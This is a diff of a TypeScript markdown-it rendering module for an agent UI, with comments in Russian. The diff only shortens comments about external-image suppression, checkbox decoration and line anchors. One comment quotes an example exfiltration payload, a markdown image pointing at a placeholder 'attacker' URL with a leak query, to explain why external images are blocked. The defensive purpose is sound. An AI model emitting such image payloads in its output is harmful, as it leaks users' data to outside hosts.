@@ -23,14 +23,8 @@ md.renderer.rules.link_open = (tokens, idx, options, env, self) => {
   return renderLinkOpen(tokens, idx, options, env, self)
 }
 
-// Глушение внешних markdown-картинок. `![](https://attacker/?leak)` — существующий
-// канал эксфильтрации из текста агента: браузер тянет внешний URL при рендере.
-// Экземпляр md общий для плана и ленты — обоим внешние картинки не нужны, поэтому
-// правим общий рендерер. Разрешаем ЛЮБУЮ same-origin относительную ссылку
-// (`/abs`, `./rel`, `rel/path`, `../x`) — такие рендерились и раньше; глушим
-// только то, что делает запрос на ЧУЖОЙ origin: явную схему (`http:`, `https:`,
-// `data:`, `javascript:` …) и protocol-relative `//host`. Внешнее заменяется
-// экранированным alt-текстом, без <img>.
+// Глушение внешних markdown-картинок. `![](https://attacker/?leak)` — существующий канал эксфильтрации из
+// текста агента: браузер тянет внешний URL при рендере.
 const renderImage =
   md.renderer.rules.image ??
   ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))
@@ -64,13 +58,8 @@ const SPECIAL_SECTIONS: Record<string, SpecialSection> = {
   '## Acceptance Criteria': { css: 'plan-section-criteria', icon: '✓', label: 'Acceptance Criteria' },
 }
 
-// codeBlockLineRanges возвращает 0-based полуинтервалы [start, end) строк, которые
-// markdown-it классифицирует как КОД — как fenced (``` / ~~~, любой длины/отступа
-// ≤3), так и indented (отступ ≥4 пробелов). Потребитель (splitImageMarkers) по ним
-// решает, можно ли трактовать строку как маркер картинки: маркер внутри кода —
-// это текст примера, а не запрос картинки. Опираемся на разбор самого markdown-it
-// (а не на ручной line-scanner), чтобы совпадать с фактическим рендером во всех
-// краевых случаях (tilde-fence, indented code, вложенность).
+// codeBlockLineRanges берёт 0-based [start,end) из markdown-it, чтобы маркеры картинок внутри любого
+// code-блока оставались текстом.
 export function codeBlockLineRanges(text: string): Array<[number, number]> {
   const ranges: Array<[number, number]> = []
   for (const token of md.parse(text, {})) {
@@ -81,20 +70,16 @@ export function codeBlockLineRanges(text: string): Array<[number, number]> {
   return ranges
 }
 
-// Блочный рендер markdown: спецсекции (## Assumptions / ## Acceptance Criteria) в
-// сворачиваемых обёртках + чекбоксы. Соответствует renderMarkdownHTML + decorate
-// в текущем app.js.
+// Блочный рендер markdown: спецсекции (## Assumptions / ## Acceptance Criteria) в сворачиваемых обёртках +
+// чекбоксы. Соответствует renderMarkdownHTML + decorate в текущем app.js.
 export function renderMarkdown(text: string): string {
   if (text.trim() === '') return ''
 
   return decorateCheckboxes(splitAndRender(text))
 }
 
-// Нейтральный блочный рендер markdown БЕЗ plan-специфики: не сворачивает спец-секции
-// (## Assumptions / ## Acceptance Criteria) и НЕ применяет decorateCheckboxes (та бьёт
-// по `[x]`/`[ ]` даже внутри `<code>`). Тот же настроенный экземпляр md (html:false —
-// без XSS, linkify, ссылки target=_blank). Для потребителей вне плана — например ленты,
-// где текст агента может содержать любой markdown, а plan-обёртки только мешают.
+// Нейтральный блочный рендер markdown БЕЗ plan-специфики: не сворачивает спец-секции и НЕ применяет
+// decorateCheckboxes.
 export function renderPlainMarkdown(text: string): string {
   if (text.trim() === '') return ''
   return md.render(text)
@@ -173,18 +158,12 @@ function decorateCheckboxes(html: string): string {
     .replace(/\[ \]/g, '<span class="cb cb-open">&#9744;</span>')
 }
 
-// ────────────────────────────────────────────────────────────────────────────
-// Anchored-рендер: один парс, рендер срезов токенов, аннотация якорей data-line
-// ────────────────────────────────────────────────────────────────────────────
-//
-// Отдельный от общего `md` экземпляр — глобальная правка его правил (fence-wrapper,
-// token-aware чекбоксы) НЕ должна протечь к renderPlainMarkdown/ленте/обычному плану.
-// Конфиг тот же: html:false (без XSS), linkify:true.
+// Отдельный markdown-it для data-line якорей изолирует правила fence/checkbox от остальных рендеров;
+// html:false.
 const anchoredMd = new MarkdownIt({ html: false, linkify: true })
 
-// Те же правила безопасности, что у общего `md`: внешние ссылки target=_blank/rel,
-// глушение внешних (не-same-origin) картинок. Дублируем на anchoredMd, а не мутируем
-// общий экземпляр.
+// Те же правила безопасности, что у общего `md`: внешние ссылки target=_blank/rel, глушение внешних
+// (не-same-origin) картинок. Дублируем на anchoredMd, а не мутируем общий экземпляр.
 const anchoredLinkOpen =
   anchoredMd.renderer.rules.link_open ??
   ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))
@@ -214,17 +193,8 @@ anchoredMd.renderer.rules.image = (tokens, idx, options, env, self) => {
   return anchoredImage(tokens, idx, options, env, self)
 }
 
-// Token-aware чекбоксы: подменяем ТОЛЬКО правило `text` (не code_inline/fence/
-// code_block) — вызываем сохранённый дефолтный рендерер (он экранирует HTML),
-// затем заменяем литеральные `[x]`/`[ ]` в его БЕЗОПАСНОМ результате. Так `[x]`
-// внутри `<code>`/fence больше не декорируется (прямой markdown-регресс прежнего
-// строкового decorateCheckboxes, критичный теперь, когда fence — самостоятельная
-// цель комментария).
-//
-// Документированное ограничение: `\[x]` неотличимо от `[x]` — оба после
-// inline-парсинга становятся одним text-токеном с содержимым `[x]` (обратный слэш
-// markdown-it не переносит в токен как отдельный символ здесь) — как и у прежнего
-// декоратора.
+// Token-aware чекбоксы: подменяем ТОЛЬКО правило `text` — вызываем сохранённый дефолтный рендерер, затем
+// заменяем литеральные `[x]`/`[ ]` в его БЕЗОПАСНОМ результате.
 const anchoredText =
   anchoredMd.renderer.rules.text ??
   ((tokens, idx) => escapeHtml(tokens[idx]?.content ?? ''))
@@ -235,11 +205,8 @@ anchoredMd.renderer.rules.text = (tokens, idx, options, env, self) => {
     .replace(/\[ \]/g, '<span class="cb cb-open">&#9744;</span>')
 }
 
-// fence/code_block wrapper-rule: номер строки лежит в token.meta.dataLine (НЕ в
-// attrs — стандартное fence-правило повесило бы data-line на внутренний <code>,
-// клик по padding <pre> промахнулся бы). Вызываем СОХРАНЁННОЕ дефолтное правило и
-// оборачиваем его безопасную строку в <div class="md-fence-anchor" data-line=…>.
-// Никогда не конкатенируем token.info/token.content напрямую (XSS).
+// fence/code_block wrapper-rule: номер строки лежит в token.meta.dataLine. Никогда не конкатенируем
+// token.info/token.content напрямую (XSS).
 function wrapFenceRule(defaultRule: NonNullable<typeof anchoredMd.renderer.rules.fence>) {
   return (
     tokens: Parameters<typeof defaultRule>[0],
@@ -265,22 +232,14 @@ const defaultCodeBlock =
   ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))
 anchoredMd.renderer.rules.code_block = wrapFenceRule(defaultCodeBlock)
 
-// Один top-level markdown-блок, отрендеренный ЦЕЛИКОМ. startLine/endLineExclusive —
-// 1-based полуинтервал по map блока: потребитель проверяет `startLine ≤ line <
-// endLineExclusive`, чтобы понять, к какому блоку относится комментируемая строка.
-// Внутри html могут быть НЕСКОЛЬКО якорей (data-line на под-элементах — <li>, <tr>,
-// абзац blockquote), каждый со своей УНИКАЛЬНОЙ стартовой строкой.
+// Один top-level markdown-блок, отрендеренный ЦЕЛИКОМ.
 export type Block = { startLine: number; endLineExclusive: number; html: string }
 
-// Секция: 'plain' — обычные блоки; 'special' — спец-секция плана (## Assumptions /
-// ## Acceptance Criteria), у которой ЗАГОЛОВОК вырезан (в `special` метаданные для
-// сворачиваемой обёртки). В режиме DialogChannel (specialSections:false) всегда одна
-// 'plain'-секция со всеми блоками — спец-секции не выделяются.
+// Секция: 'plain' — обычные блоки; 'special' — спец-секция плана, у которой ЗАГОЛОВОК вырезан.
 export type Section = { kind: 'plain' | 'special'; special?: SpecialSection; blocks: Block[] }
 
-// Атрибуты якоря, попадающие в innerHTML. Значения безопасны (только числовой номер
-// строки), но React ими НЕ владеет — их навешивает/снимает императивный слой (Part B).
-// Роли (`role`) НЕ ставим — `li` остаётся listitem, `tr` — row.
+// Атрибуты якоря, попадающие в innerHTML. Значения безопасны (только числовой номер строки), но React ими
+// НЕ владеет — их навешивает/снимает императивный слой (Part B).
 function anchorAttrPairs(line: number): Array<[string, string]> {
   return [
     ['data-line', String(line)],
@@ -297,9 +256,7 @@ function anchorAttrString(line: number): string {
     .join(' ')
 }
 
-// Кандидаты якорей: open-токены под-элементов (nesting===1) + self-closing hr/fence/
-// code_block (nesting===0). Списки/таблицы/thead/tbody (bullet_list_open,
-// table_open …) кандидатами НЕ являются — якорим их под-элементы (li/tr).
+// Кандидаты якорей: open-токены под-элементов + self-closing hr/fence/ code_block.
 const OPEN_ANCHOR_CANDIDATES = new Set([
   'heading_open',
   'paragraph_open',
@@ -316,13 +273,8 @@ function isAnchorCandidate(token: { type: string; nesting: number; hidden: boole
   return false
 }
 
-// Аннотирует токены якорями. Кандидатов группируем по стартовой строке map[0];
-// если на одной строке несколько (`- # H`: li level=1 / heading level=2; `1. # H`;
-// `- > quote`; li+fence) — выбираем самый ВНЕШНИЙ (минимальный level), ничьи — по
-// порядку токенов (первый). Вложенные кандидаты на ДРУГИХ строках (loose-list 2-й
-// абзац, абзац blockquote, вложенный li) — самостоятельные якоря. Гарантия: у
-// каждого якорного элемента УНИКАЛЬНАЯ стартовая строка (НЕ биекция со всеми
-// строками — setext-подчёркивание, table-разделитель, continuation якоря не имеют).
+// Аннотирует токены якорями. Вложенные кандидаты на ДРУГИХ строках (loose-list 2-й абзац, абзац
+// blockquote, вложенный li) — самостоятельные якоря.
 function annotateAnchors(tokens: ReturnType<typeof anchoredMd.parse>): void {
   const bestByLine = new Map<number, number>() // startLine(0-based) -> chosen token index
 
@@ -348,8 +300,7 @@ function annotateAnchors(tokens: ReturnType<typeof anchoredMd.parse>): void {
   }
 }
 
-// Сегментация на top-level блоки: от open-токена уровня 0 до matching close уровня 0
-// (либо один self-closing токен уровня 0 — hr/fence/code_block). Блок НЕ рвём —
+// Сегментация на top-level блоки: от open-токена уровня 0 до matching close уровня 0. Блок НЕ рвём —
 // удаление одного heading_open оставило бы висячие inline+heading_close.
 type TopBlockRange = { open: number; closeExclusive: number; map: [number, number] }
 
@@ -378,15 +329,7 @@ function topBlockRanges(tokens: ReturnType<typeof anchoredMd.parse>): TopBlockRa
   return ranges
 }
 
-// renderAnchoredSections — главный anchored-рендер. ОДИН парс полного текста →
-// token.map ГЛОБАЛЬНЫЕ. Каждый блок рендерится срезом ТОКЕНОВ (не re-parse текста —
-// иначе номера строк после первого блока неверны) с тем же env (reference-defs и
-// linkify уже разрешены полным parse). specialSections:true (PlanPanel) — спец-секции
-// выделяются в отдельные Section с ВЫРЕЗАННЫМ заголовком; false (DialogChannel) —
-// одна плоская 'plain'-секция, спец-секции не трогаются.
-//
-// Без внутреннего кэша (мемоизация — на стороне потребителя): безлимитный Map держал
-// бы все планы/вопросы вечно.
+// renderAnchoredSections — главный anchored-рендер. ОДИН парс полного текста → token.map ГЛОБАЛЬНЫЕ.
 export function renderAnchoredSections(
   text: string,
   opts: { specialSections: boolean },
